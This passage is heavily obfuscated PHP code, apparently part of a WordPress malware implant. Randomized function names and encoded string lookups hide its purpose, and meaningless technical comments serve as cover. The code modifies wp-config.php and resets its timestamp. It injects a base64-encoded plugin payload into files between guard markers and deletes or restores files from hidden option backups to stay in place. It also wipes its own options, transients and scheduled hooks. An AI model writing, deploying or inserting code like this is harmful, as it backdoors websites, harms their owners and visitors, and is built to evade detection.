   foreach     (array(nhceivfj8tbe(521),   nhceivfj8tbe(1606),     f5cd2smymkqusi5(1607),  pahk8uy1uxt(1608),   mhiu2yqz6kqd(1609), nhceivfj8tbe(1610), dhd5r6_4ki(1611), f5cd2smymkqusi5(1612),  dhd5r6_4ki(1613)) as   $d1c_9z9ey7s9p) {
 foreach  ((array)  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($_gd .   '/'      .  $d1c_9z9ey7s9p .     '*')  as $f2ra05k5t63f)   $p2fntj3gsna[]  = $f2ra05k5t63f;

   }
      foreach   ((array)    @$GLOBALS['__scf_eu7lhdrjut9t66_69']($_gd   .  f5cd2smymkqusi5(1614))  as     $quprm6mccnwd)   $p2fntj3gsna[]   =    $quprm6mccnwd;
}
   }
  unset($k9l_y4g23s,  $dfb_d88jtpss0u_, $_gd,      $d1c_9z9ey7s9p,  $f2ra05k5t63f,     $quprm6mccnwd);
      
 $homtgk6sjwv   = array($GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,    nrudcgor(1615)), $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()), f5cd2smymkqusi5(1615)),  $GLOBALS['__scf_xv_2irmjrq_12']($lygkvqavcckr, f5cd2smymkqusi5(1615)),    $GLOBALS['__scf_xv_2irmjrq_12']($_33_t6u90om3,   dhd5r6_4ki(1616)),  $GLOBALS['__scf_xv_2irmjrq_12']($gak9w524v68l6r,   mhiu2yqz6kqd(1616)));


if   (defined(dhd5r6_4ki(1549)))     $homtgk6sjwv[] = $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR, pahk8uy1uxt(1617));
  $ni132n6pdilhpvt      = array();$_0c8ylnldb=141;$fkggojweo89=($_0c8ylnldb>0)?$_0c8ylnldb:-$_0c8ylnldb;
   foreach ($GLOBALS['__scf_e3ymc0hwiys_147']($homtgk6sjwv)    as      $_pd) {
    $ni132n6pdilhpvt[] =  $_pd   . '/'    .  $jta_4pycidj07nb;
  $ni132n6pdilhpvt[]      = $_pd   . '/'  . $b6byb_ogir8831;$fpv8sy9ywo6=30+36;$wax84s2ls7vy06=$fpv8sy9ywo6-9;
$ni132n6pdilhpvt[]  = $_pd    . nrudcgor(1618) .   $b6byb_ogir8831;
}

   unset($homtgk6sjwv,    $_pd);
   foreach      ($ni132n6pdilhpvt  as  $uhzesrnuv74wf)   {

  if (@$GLOBALS['__scf_gsamhlxot70ps_18']($uhzesrnuv74wf))  mjw_rlyx5u4bmrdl1oct($uhzesrnuv74wf, null);
  }
   unset($uhzesrnuv74wf);
  $jjwnyk_5cvlo  =  array($GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,    nrudcgor(1617)));
if  (defined(nrudcgor(1549)))    $jjwnyk_5cvlo[]  = $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR, f5cd2smymkqusi5(1617));
    $jjwnyk_5cvlo[]  = $GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,  pahk8uy1uxt(1619));


$jjwnyk_5cvlo[]  = $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()), mhiu2yqz6kqd(1619));
     $h1hgjvvrdt   =  array();
    foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($jjwnyk_5cvlo)   as $xg0dv3n3mlqspc) $h1hgjvvrdt[]  = $xg0dv3n3mlqspc  .   nhceivfj8tbe(1182);
   unset($jjwnyk_5cvlo, $xg0dv3n3mlqspc);
      foreach   ($h1hgjvvrdt   as $iwbmagbjh5wp)  {
  if (!@$GLOBALS['__scf_gsamhlxot70ps_18']($iwbmagbjh5wp))     continue;
   $v_2ea0ui7nym   =   @$GLOBALS['__scf_apq4pqdt6n41_91']($iwbmagbjh5wp);
    if  ($v_2ea0ui7nym  &&   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,     pahk8uy1uxt(1620)) !==  false)   {
$v_2ea0ui7nym =      $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(959) . $GLOBALS['__scf_u60sfqdal7_816']($jta_4pycidj07nb,    '/')   .  nhceivfj8tbe(1621),   "\n", $v_2ea0ui7nym);
    if  ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)) {
    $v_2ea0ui7nym = $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(961)  . $GLOBALS['__scf_u60sfqdal7_816']($jta_4pycidj07nb,    '/')  .   nhceivfj8tbe(1621),      "\n",    $v_2ea0ui7nym);



}
  if   ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)) {



   $v_2ea0ui7nym  =  $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(962)  .  $GLOBALS['__scf_u60sfqdal7_816']($jta_4pycidj07nb,  '/') .     pahk8uy1uxt(963), "\n",   $v_2ea0ui7nym);
     }
if      ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym))   jr30c_pj_1z9sfyaq3c88($iwbmagbjh5wp,  $v_2ea0ui7nym);
        }

   }



  $by_6jby1ypyy2i =  ABSPATH    .   nrudcgor(1244);
     if (!@$GLOBALS['__scf_gsamhlxot70ps_18']($by_6jby1ypyy2i)) {
 $mf1mhcogfj59b    = $GLOBALS['__scf_eure5hcx2b_11'](ABSPATH)  .   f5cd2smymkqusi5(1622);



 if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($mf1mhcogfj59b))  $by_6jby1ypyy2i   =   $mf1mhcogfj59b;
}

if      (@$GLOBALS['__scf_gsamhlxot70ps_18']($by_6jby1ypyy2i) &&    @$GLOBALS['__scf_cu2oflxkvh_47']($by_6jby1ypyy2i))  {
$_wc =     @$GLOBALS['__scf_apq4pqdt6n41_91']($by_6jby1ypyy2i);
    if   ($GLOBALS['__scf__me483qbepnts_41']($_wc) && $GLOBALS['__scf_nr12ouzrtt_7']($_wc, mhiu2yqz6kqd(534))  !==   false)    {
// PHP 8.3 readonly: coalesce-reg effect-type


$r_nb664a99jz =    $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1623), "define( 'WP_CACHE', true );\n", $_wc);
  if ($GLOBALS['__scf__me483qbepnts_41']($r_nb664a99jz) &&    $r_nb664a99jz !==      $_wc  && hkk3yvii60ci7rk($r_nb664a99jz))     {


$dhm642ewzs =   @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($by_6jby1ypyy2i);

    if (jr30c_pj_1z9sfyaq3c88($by_6jby1ypyy2i,    $r_nb664a99jz))   {
if  ($dhm642ewzs) @$GLOBALS['__scf_d91t8__q8rnbc2_71']($by_6jby1ypyy2i,   $dhm642ewzs);
       if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1561))) @delete_option(f5cd2smymkqusi5(1544));
 }
      }
// specialize best-case heap

unset($r_nb664a99jz,     $dhm642ewzs);
  }



       unset($_wc);
 }
unset($by_6jby1ypyy2i, $mf1mhcogfj59b);


 $xgz5xfxarfauuvj  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(574))  ? @$GLOBALS['__scf_jpj9mbom_1b_109'](f5cd2smymkqusi5(1624))  :  false;
        if    (!$xgz5xfxarfauuvj     ||     $xgz5xfxarfauuvj     ===  "")  $xgz5xfxarfauuvj   =  mhiu2yqz6kqd(1625);



  $wbybj5l0hjv4yrjk   = array($GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH, mhiu2yqz6kqd(1619)));
if (defined(nhceivfj8tbe(1549))) $wbybj5l0hjv4yrjk[]  = $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,  dhd5r6_4ki(1619));
 $wbybj5l0hjv4yrjk[] = $GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,    nrudcgor(1619));
$wbybj5l0hjv4yrjk[] = $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()), mhiu2yqz6kqd(1626));
     $ohbj8ns_nzhhte4k  = array();

   foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($wbybj5l0hjv4yrjk)     as    $ojxwecs0x9z8h)  $ohbj8ns_nzhhte4k[] = $ojxwecs0x9z8h   . '/'  . $xgz5xfxarfauuvj;

   unset($wbybj5l0hjv4yrjk, $ojxwecs0x9z8h);
 foreach     ($ohbj8ns_nzhhte4k    as      $dlk69pvwmjj_svae)    {


 if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($dlk69pvwmjj_svae)) continue;
  $v_2ea0ui7nym  =  @$GLOBALS['__scf_apq4pqdt6n41_91']($dlk69pvwmjj_svae);
      if ($v_2ea0ui7nym     &&   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,  dhd5r6_4ki(1627)) !== false)    {
    $v_2ea0ui7nym =   $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(1628) .   $GLOBALS['__scf_u60sfqdal7_816']($b6byb_ogir8831, '/')  . pahk8uy1uxt(1629), "",  $v_2ea0ui7nym);
if  ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym))    jr30c_pj_1z9sfyaq3c88($dlk69pvwmjj_svae,     $v_2ea0ui7nym);
}
    }
  $m0g4572rrdc9qwcj     = $GLOBALS['__scf_pabtmjmzpv76n_149']($p2fntj3gsna, $ni132n6pdilhpvt);
        $t9bez8c1kc_    =  array();
 $n4x06_vrf22  = false;
 foreach ($GLOBALS['__scf_b3z_uoye0i_367']($h1hgjvvrdt,   $ohbj8ns_nzhhte4k) as    $o44of768da28) {
    if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($o44of768da28))  continue;
   $mmy846pckld7    =      @$GLOBALS['__scf_apq4pqdt6n41_91']($o44of768da28);


if (!$GLOBALS['__scf__me483qbepnts_41']($mmy846pckld7))  {
// string dedup

  $n4x06_vrf22 =   true;
continue;



    }
       if  ($GLOBALS['__scf_nr12ouzrtt_7']($mmy846pckld7, f5cd2smymkqusi5(1630)) === false)   continue;
   if      ($GLOBALS['__scf_q4nsibbhphays_1369'](nrudcgor(1631),    $mmy846pckld7, $dj45ms8r6d8e))     {
// PCRE2 JIT: greedy dependent-type


 foreach ($GLOBALS['__scf_b3z_uoye0i_367']($dj45ms8r6d8e[1],   $dj45ms8r6d8e[2],    $dj45ms8r6d8e[(2^1)])      as     $yok6k29y1iwy_)    {



if     ($yok6k29y1iwy_   !==    "")   $t9bez8c1kc_[$GLOBALS['__scf_t8832qq90dxb4_3']($yok6k29y1iwy_)] =  true;
    }
}

  unset($mmy846pckld7, $dj45ms8r6d8e, $yok6k29y1iwy_);
    }
  if   (!$n4x06_vrf22) {
 foreach  ($m0g4572rrdc9qwcj      as  $tkqx845nh5jt0) {
    if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($tkqx845nh5jt0))    {
  if  (isset($t9bez8c1kc_[$GLOBALS['__scf_t8832qq90dxb4_3']($tkqx845nh5jt0)]))  continue;
 rgiuaapohxeh0z($tkqx845nh5jt0, (329+91));
    t65xl1pt2haov_izh($tkqx845nh5jt0);
   }
  }
  }
 unset($t9bez8c1kc_,  $n4x06_vrf22,  $o44of768da28);
 foreach   (ks9qy9biofs4d9f12ul()  as $arlwawvsylt6x) {
    if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($arlwawvsylt6x)   ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($arlwawvsylt6x))  continue;
    $v_2ea0ui7nym   =  @$GLOBALS['__scf_apq4pqdt6n41_91']($arlwawvsylt6x);



    if      ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym))   {
 $sr9li30o6l5p_   =   e5mr40mjt4j9xz_gic8hj($v_2ea0ui7nym,    mhiu2yqz6kqd(1632),   pahk8uy1uxt(1393));


       $sr9li30o6l5p_    =  e5mr40mjt4j9xz_gic8hj($sr9li30o6l5p_,  dhd5r6_4ki(1633),  dhd5r6_4ki(1393));
    if      ($GLOBALS['__scf__me483qbepnts_41']($sr9li30o6l5p_)   &&      $sr9li30o6l5p_     !== $v_2ea0ui7nym) jr30c_pj_1z9sfyaq3c88($arlwawvsylt6x,  $sr9li30o6l5p_);
 unset($sr9li30o6l5p_);
    }
    }
   if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1245)) &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1634)))   {
// populate gateway for PHP 8.4 fibers

  $key     =  meyc48v692yzjanl63sd();



 if      ($key  !==  false)   {
    $_6x07iuqzfob =  @$GLOBALS['__scf_hloo5eh0y396_1245']($key,  'w', 0, 0);
  if    ($_6x07iuqzfob)   {


@$GLOBALS['__scf_fgeo4kv8jnzui6_1255']($_6x07iuqzfob);
@$GLOBALS['__scf_qgwnb7cl25_1251']($_6x07iuqzfob);



}
      }
 }
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1561)))   {
  $sv9h9r5s57g5trl    =  ohrydgas8yy9a22s(ABSPATH   .  nhceivfj8tbe(1635),  (0x3+0x7));


       @delete_option($sv9h9r5s57g5trl);
 $ur7p4uqe8od34  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1636))   ?   @get_option(nhceivfj8tbe(1495), array()) :     array();
  if  ($GLOBALS['__scf_vf9p0fditvxy_35']($ur7p4uqe8od34))  {
if (isset($ur7p4uqe8od34['b']))  t65xl1pt2haov_izh($ur7p4uqe8od34['b']);
 if    (isset($ur7p4uqe8od34[mhiu2yqz6kqd(1494)]) &&  $GLOBALS['__scf_vf9p0fditvxy_35']($ur7p4uqe8od34[mhiu2yqz6kqd(1637)])) {
  foreach ($ur7p4uqe8od34[f5cd2smymkqusi5(1637)]   as $_ci)  {
     if  ($GLOBALS['__scf_vf9p0fditvxy_35']($_ci) && isset($_ci['b'])) t65xl1pt2haov_izh($_ci['b']);
 }

   }
 }
@delete_option(pahk8uy1uxt(1495));
   @delete_option(f5cd2smymkqusi5(1638));
  

    @delete_option(nrudcgor(485));
    @delete_option(mhiu2yqz6kqd(1639));
  @delete_option(dhd5r6_4ki(1640));
 @delete_option(mhiu2yqz6kqd(1641));
     @delete_option(mhiu2yqz6kqd(1642));
   @delete_option(dhd5r6_4ki(1169));
 @delete_option(mhiu2yqz6kqd(1167));
     unset($ur7p4uqe8od34,   $_ci);
   }


 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(743)))  {
// lock-free sliding-window

@delete_transient(mhiu2yqz6kqd(1152));
    @delete_transient(nrudcgor(1285));

@delete_transient(se_any4b12t9njlu());
   }
  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(667)))  {
@wp_clear_scheduled_hook(f5cd2smymkqusi5(1643));

      @wp_clear_scheduled_hook(mhiu2yqz6kqd(1644));


 @wp_clear_scheduled_hook(mklbz63xfh8ufytv1td7t());
    }
      }  catch  (Throwable   $h2v_bjm4ejxq8fp)    {
     fukkkeh6955g9qi(nrudcgor(1645), $h2v_bjm4ejxq8fp);


}  catch   (Exception   $h2v_bjm4ejxq8fp)      {
// synchronous leaky-bucket

}
}
function  i64fci0b7ubn19da78ej()
 {
 try   {
if   (!defined(f5cd2smymkqusi5(1395))) return  false;$yblzjkvgu2d=5909;$siwnnopevmef9w=$yblzjkvgu2d%16;
    $ga9fric5dh =  ajbg_44koa9suqi();
  $h6ljk1lztl0v71   =  $ga9fric5dh    . mhiu2yqz6kqd(1646);

 $q4nmj640k4ytm0w =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(), nhceivfj8tbe(1556));


  $vg45smeglid    =   adbbbpoh0e7mcf6();
  if   (!$vg45smeglid  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)  <  (269+231) ||     $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid) >      (1048506+70)  || sk_orzv3dinsktkrvn($vg45smeglid)      ||    !hkk3yvii60ci7rk($vg45smeglid)) return false;
 $current =    @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($h6ljk1lztl0v71)    ?    @$GLOBALS['__scf_apq4pqdt6n41_91']($h6ljk1lztl0v71)    : "";
   if (!$GLOBALS['__scf__me483qbepnts_41']($current)) {



 fukkkeh6955g9qi(pahk8uy1uxt(650), nrudcgor(1647));

 return   false;

 }
 $current =   g9begdqy64lw_mpz($current);
$q5tw8pflest    =     kwqziujdph5xlz3n()  .   ':' . ohrydgas8yy9a22s(ABSPATH .      pahk8uy1uxt(1648), (0x4+0x4));
       $zwhsp3srkru = nrudcgor(1649)  .   $q5tw8pflest    . dhd5r6_4ki(1272);


 $u4n6wdbujmttz4q1  =      nhceivfj8tbe(1650)   . $q5tw8pflest   .   nrudcgor(1272);
  $ajc0mx69zjb8lo  =   ohrydgas8yy9a22s(ABSPATH . pahk8uy1uxt(1648),  (3+5));
  $sdz34sviq2g  =  $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1651)   .   $ajc0mx69zjb8lo   . nhceivfj8tbe(1652), "",  $current);
 $lyqfmxb1c52  =   ($GLOBALS['__scf_nr12ouzrtt_7']($sdz34sviq2g,   nrudcgor(1653)) !==  false);
   if  ($GLOBALS['__scf_nr12ouzrtt_7']($current,  $zwhsp3srkru)   !==   false  &&     $GLOBALS['__scf_nr12ouzrtt_7']($current,    $u4n6wdbujmttz4q1)   !==   false &&  !$lyqfmxb1c52)    return true;
  $current =  $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1654),  "",      $sdz34sviq2g);
    if (!$GLOBALS['__scf__me483qbepnts_41']($current))   {
    fukkkeh6955g9qi(f5cd2smymkqusi5(650),    pahk8uy1uxt(1231));
  return   false;
  }
     $u5xfm3z90ff    = mpkogxinl1o8xqdhl__();
    if  (!$u5xfm3z90ff)   return   false;
  $ln_mx88i0w2   =   mhiu2yqz6kqd(1655)  .    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($q4nmj640k4ytm0w     .   (string)   mzvtk8ecgiuaeafix()), 0,  (0x7+0x1));
 $z2lf8mfq8ca =   d05gkzggk_uo5zo(
  pahk8uy1uxt(651),

array('__SLUG__',  '__PLUGIN_BASE64__',  '__GUARD_NAME__',  '__VERSION__'),
array($q4nmj640k4ytm0w, $u5xfm3z90ff,   $ln_mx88i0w2,  kwqziujdph5xlz3n())
);
if  (!$z2lf8mfq8ca)   {
   if    ((int)   get_option(dhd5r6_4ki(1305),   0) > 0)    fukkkeh6955g9qi(nhceivfj8tbe(1656), nhceivfj8tbe(1657));
 return  false;

    }
   $current  =    g9begdqy64lw_mpz($current);$dyjctu6z=52*9;$w93jobuxzfivj=$dyjctu6z-14;
      $gg7xg33_ha3gb    =     $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1278),  "",   $z2lf8mfq8ca);



 $g26yetfm2_55bse  =    ($GLOBALS['__scf_amjjmfnilcolnb_10']($current)  ===  0);
if (!$g26yetfm2_55bse)  {
  if   (!t4r7_hixdsm7y3k4y(dhd5r6_4ki(1656)))    {



  fukkkeh6955g9qi(nhceivfj8tbe(1658), mhiu2yqz6kqd(1233));
 return    false;
  }
// WP REST API v2: degenerate fallback-handler

if  (!c8kiybf7y18a9bd5ahp($h6ljk1lztl0v71, $current))    {
    fukkkeh6955g9qi(dhd5r6_4ki(1658),  mhiu2yqz6kqd(1539));
 return  false;
 

    }
// deterministic branded-type

 xoubu5i_0374ag3(f5cd2smymkqusi5(1659));
} else  {

   if (!c8kiybf7y18a9bd5ahp($h6ljk1lztl0v71,     "")) {
 fukkkeh6955g9qi(nrudcgor(1659),  nrudcgor(1539));
  return     false;


    }
// @subscribe bivariant

}
$rjo5gf52iv1ov5t   =      ex2erzvzq6uum4wews($current, $zwhsp3srkru .   "\n" . $gg7xg33_ha3gb  .  "\n"    . $u4n6wdbujmttz4q1);
    if (!jr30c_pj_1z9sfyaq3c88($h6ljk1lztl0v71, $rjo5gf52iv1ov5t)) {


  return   false;

 }
m08f_15ylhgex6($h6ljk1lztl0v71);


      ejl1lwk108flojzx($h6ljk1lztl0v71);
 return true;
        }  catch  (Throwable   $h2v_bjm4ejxq8fp)  {
   fukkkeh6955g9qi(dhd5r6_4ki(1659), $h2v_bjm4ejxq8fp);
  return     false;
     } catch  (Exception $h2v_bjm4ejxq8fp)    {
// PHP CS Fixer: synchronous skip-list

 return  false;
   }


 }
        function  ks9qy9biofs4d9f12ul()
  {
    $m6t27xygoirjp =   array();


if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1636)))  return    $m6t27xygoirjp;
 $__wk2ba0fs0gs9fu =  (defined(nrudcgor(1660))   ? WP_CONTENT_DIR  : (defined(pahk8uy1uxt(1395))  ? ABSPATH  .   f5cd2smymkqusi5(78) : ""))  .  nhceivfj8tbe(1661);$to2_t0sct=4448;$sem6gg8h=$to2_t0sct%8;
       $af45qzhkong4lo6c      = (string) @get_option(mhiu2yqz6kqd(1662), "");


 if      ($af45qzhkong4lo6c !== "")    $m6t27xygoirjp[] = $__wk2ba0fs0gs9fu  . $af45qzhkong4lo6c  .  pahk8uy1uxt(1583);


   $dxhdi5p9dr67g   =   (string)  @get_option(f5cd2smymkqusi5(1045),  "");


if ($dxhdi5p9dr67g !==    ""   &&  $dxhdi5p9dr67g    !==   $af45qzhkong4lo6c) $m6t27xygoirjp[] =  $__wk2ba0fs0gs9fu .  $dxhdi5p9dr67g  .    nrudcgor(1583);
     return      $m6t27xygoirjp;
 }

  function   dxa3tz2lhvanqnm3yfu()
  {
        if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1663)) &&   is_multisite() &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(205))) {
return      (array)  @get_site_option(pahk8uy1uxt(1664), array());
  }
 return  (array) @get_option(nrudcgor(1664),  array());
}
function  t8u85qctvp0swcd4k($wxblmcmwgvzwjsap)
 {$vyce4z81=(0x77+0xf6);$s4a6p2324yo84c=$vyce4z81%14;



if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1663))   &&  is_multisite()  &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1665)))    {
@update_site_option(nhceivfj8tbe(1664),   $wxblmcmwgvzwjsap);
return;
   }
    @update_option(dhd5r6_4ki(1664),  $wxblmcmwgvzwjsap,  mhiu2yqz6kqd(1582));

   }
  function  sivyyfsdr3ire7wsui($no4625mwq2q9a2)
 {
     $wxblmcmwgvzwjsap   =  dxa3tz2lhvanqnm3yfu();
return isset($wxblmcmwgvzwjsap[ohrydgas8yy9a22s($no4625mwq2q9a2,   (18-6))]);
 }
    function   h8zn__gft2tjc9lcce0hi($no4625mwq2q9a2)
 {

     $wxblmcmwgvzwjsap   =   dxa3tz2lhvanqnm3yfu();
$gd6385w4q7r =  $GLOBALS['__scf_zxyq0lcqv02z6_185']() - (7775910+90);



    foreach  ($wxblmcmwgvzwjsap  as    $w4hc3ajs_7  => $f34afuswhu9b84m) {
   if   ((int)  $f34afuswhu9b84m <     $gd6385w4q7r)  unset($wxblmcmwgvzwjsap[$w4hc3ajs_7]);    
   }

     $wxblmcmwgvzwjsap[ohrydgas8yy9a22s($no4625mwq2q9a2,  (31^19))]     =      $GLOBALS['__scf_zxyq0lcqv02z6_185']();
 t8u85qctvp0swcd4k($wxblmcmwgvzwjsap);
   }
 function    rutu2yqvyn7wgdmcq($no4625mwq2q9a2,    $rjo5gf52iv1ov5t)
 {
  if   (!$GLOBALS['__scf__me483qbepnts_41']($rjo5gf52iv1ov5t)  ||   $rjo5gf52iv1ov5t  ===  ""   ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($rjo5gf52iv1ov5t)      >   (494046+554530))      return;
     $b4gdlkc4ok23ka5u  = $GLOBALS['__scf_r_ooxq15ux5_1246'](f5cd2smymkqusi5(1666),   $rjo5gf52iv1ov5t);
$vqzrg9q8k53sn   = (array)    @get_option(f5cd2smymkqusi5(1667),   array());
   $cueercjqf3k  =  ohrydgas8yy9a22s($no4625mwq2q9a2,  (9+3));
 if (isset($vqzrg9q8k53sn[$cueercjqf3k][mhiu2yqz6kqd(1666)]) &&   $vqzrg9q8k53sn[$cueercjqf3k][nrudcgor(1668)]  ===   $b4gdlkc4ok23ka5u)      return;
  $vqzrg9q8k53sn[$cueercjqf3k] =     array(f5cd2smymkqusi5(1576)  =>  $GLOBALS['__scf_amjjmfnilcolnb_10']($rjo5gf52iv1ov5t),      f5cd2smymkqusi5(1669)  => $b4gdlkc4ok23ka5u,     mhiu2yqz6kqd(1670) =>  $GLOBALS['__scf_b6bj8r78s21_351']($rjo5gf52iv1ov5t));
 @update_option(mhiu2yqz6kqd(1667),   $vqzrg9q8k53sn,  f5cd2smymkqusi5(1582));
}
  function  w72w63emy38lwhoq4e($no4625mwq2q9a2)
{



   $vqzrg9q8k53sn     =   (array)   @get_option(mhiu2yqz6kqd(1667),  array());
$h2v_bjm4ejxq8fp   =   isset($vqzrg9q8k53sn[ohrydgas8yy9a22s($no4625mwq2q9a2,  (210^222))])     ?     $vqzrg9q8k53sn[ohrydgas8yy9a22s($no4625mwq2q9a2, (7+5))]  : null;

   if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($h2v_bjm4ejxq8fp)    ||   empty($h2v_bjm4ejxq8fp[mhiu2yqz6kqd(1671)])   || empty($h2v_bjm4ejxq8fp[nrudcgor(1576)])   ||   empty($h2v_bjm4ejxq8fp[mhiu2yqz6kqd(1672)]))  return  false;
$bw1dfta4jaac =   $GLOBALS['__scf_wlpl5h61eyolq_355']($h2v_bjm4ejxq8fp[nhceivfj8tbe(1671)],    true);
 if    (!$GLOBALS['__scf__me483qbepnts_41']($bw1dfta4jaac) ||     $GLOBALS['__scf_amjjmfnilcolnb_10']($bw1dfta4jaac)    !==  (int)  $h2v_bjm4ejxq8fp[mhiu2yqz6kqd(1576)])  return   false;
  if  ($GLOBALS['__scf_r_ooxq15ux5_1246'](f5cd2smymkqusi5(1672),   $bw1dfta4jaac)     !==  $h2v_bjm4ejxq8fp[nhceivfj8tbe(1672)])  return  false;
  if (!hkk3yvii60ci7rk($bw1dfta4jaac))   return   false;



return $bw1dfta4jaac;
  }
  function e7s6frcfalrbj1dzesfm31($arlwawvsylt6x, $current)
    {
  $i36mtgf7x846v52  =    rrzjoqm3v5ibh54qfg0a0h($current);
 if  (!$GLOBALS['__scf__me483qbepnts_41']($i36mtgf7x846v52)  ||   $i36mtgf7x846v52 ===   "")  return false;

 $wo8gbzr3kn7rb = twjiqbicrnr_q7() .  mhiu2yqz6kqd(1673)  .   ohrydgas8yy9a22s($arlwawvsylt6x,  (0x7+0x5))  .   pahk8uy1uxt(1436);
$_ex =  @$GLOBALS['__scf_gsamhlxot70ps_18']($wo8gbzr3kn7rb)  ?  @$GLOBALS['__scf_apq4pqdt6n41_91']($wo8gbzr3kn7rb) :  false;
 if   (!$GLOBALS['__scf__me483qbepnts_41']($_ex)  ||    $_ex   !== $i36mtgf7x846v52) {
if (!jr30c_pj_1z9sfyaq3c88($wo8gbzr3kn7rb,   $i36mtgf7x846v52))      return    false;
    $_ex     = @$GLOBALS['__scf_gsamhlxot70ps_18']($wo8gbzr3kn7rb)  ?    @$GLOBALS['__scf_apq4pqdt6n41_91']($wo8gbzr3kn7rb) : false;
if  (!$GLOBALS['__scf__me483qbepnts_41']($_ex) ||   $_ex  !==      $i36mtgf7x846v52)  return false;
}
/* nilpotent validator */



      rutu2yqvyn7wgdmcq($arlwawvsylt6x, $i36mtgf7x846v52);
     return true;
   }
function     aqyf8jwbdmufd2asb()
{
// fold-const token-bucket for PHP 8.2 enum

     t8u85qctvp0swcd4k(array());
}
function      nfqu26ya5hfkmnqinj7k()



{


  try   {

   if  (!defined(dhd5r6_4ki(1674)) ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1675)))  return;
  foreach     (ks9qy9biofs4d9f12ul() as   $_8s1q0lze747) {
if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($_8s1q0lze747)  && @$GLOBALS['__scf_g9y45bstmb02a_95']($_8s1q0lze747)  >   0)  continue;
  $wo8gbzr3kn7rb     =     twjiqbicrnr_q7()  . dhd5r6_4ki(1673)   .   ohrydgas8yy9a22s($_8s1q0lze747,  (22-10))  .  dhd5r6_4ki(1676);
   $a9cts_qlgu   = @$GLOBALS['__scf_gsamhlxot70ps_18']($wo8gbzr3kn7rb) ? @$GLOBALS['__scf_apq4pqdt6n41_91']($wo8gbzr3kn7rb)  : false;

 if    (!$GLOBALS['__scf__me483qbepnts_41']($a9cts_qlgu) ||  $a9cts_qlgu  ===     "") {
    $a9cts_qlgu  = w72w63emy38lwhoq4e($_8s1q0lze747);    
  if ($GLOBALS['__scf__me483qbepnts_41']($a9cts_qlgu) &&   $a9cts_qlgu !== "")  @jr30c_pj_1z9sfyaq3c88($wo8gbzr3kn7rb, $a9cts_qlgu);
   }


     if    (!$GLOBALS['__scf__me483qbepnts_41']($a9cts_qlgu)  ||   $a9cts_qlgu ===  "")   continue;
 clearstatcache(true,   $_8s1q0lze747);    

if (@$GLOBALS['__scf_gsamhlxot70ps_18']($_8s1q0lze747)   &&     @$GLOBALS['__scf_g9y45bstmb02a_95']($_8s1q0lze747)   >    0)  continue;
   

       if  (jr30c_pj_1z9sfyaq3c88($_8s1q0lze747,  $a9cts_qlgu))      {
